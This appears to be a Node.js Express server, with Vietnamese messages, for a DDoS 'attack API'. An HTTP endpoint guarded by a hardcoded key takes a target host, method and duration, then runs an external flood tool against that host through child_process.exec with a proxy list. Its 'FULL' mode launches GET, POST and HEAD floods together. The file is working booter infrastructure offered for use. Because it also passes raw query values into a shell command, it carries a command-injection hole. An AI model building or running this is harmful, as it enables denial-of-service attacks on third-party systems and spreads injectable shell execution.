const express = require("express");
const { exec } = require("child_process");
const app = express();
const port = 80;
const MAX_CONCURRENT_ATTACKS = 1;

let activeAttacks = 0;
let currentPID = null;

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 200) return "THỜI GIAN PHẢI < 200S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command) => {
  return new Promise((resolve, reject) => {
    const childProcess = exec(command, (error, stdout, stderr) => {
      if (stderr) {
        console.error(stderr);
        reject(stderr);
      } else {
        resolve(stdout);
      }
    });

    // Lưu PID của tiến trình
    currentPID = childProcess.pid;

    // Khi tiến trình kết thúc, giải phóng slot
    childProcess.on("close", () => {
      activeAttacks--;
      currentPID = null;
      console.log(`Tiến trình ${currentPID} đã kết thúc. Slot được giải phóng.`);
    });
  });
};

const executeAllAttacks = (methods, host, time) => {
  const commands = methods.map((method) => {
    return `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`;
  });

  // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
  commands.forEach(executeAttack);
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul } = req.query;

  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });
  }

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage) {
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });
  }

  activeAttacks++;

  if (modul === "FULL") {
    const methods = ["GET", "POST", "HEAD"];
    executeAllAttacks(methods, host, time);  // Chạy đồng thời các lệnh tấn công mà không chờ kết quả
    res.status(200).json({ 
      status: "SUCCESS", 
      message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", 
      host, 
      port, 
      time, 
      modul: "GET POST HEAD", 
      method: "attack", 
      pid: currentPID 
    });
  } else {
    const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
    executeAttack(command);  // Chạy tấn công cho modul không phải FULL
    res.status(200).json({ 
      status: "SUCCESS", 
      message: "LỆNH TẤN CÔNG ĐÃ GỬI", 
      host, 
      port, 
      time, 
      modul, 
      method: "attack", 
      pid: currentPID 
    });
  }
});

app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
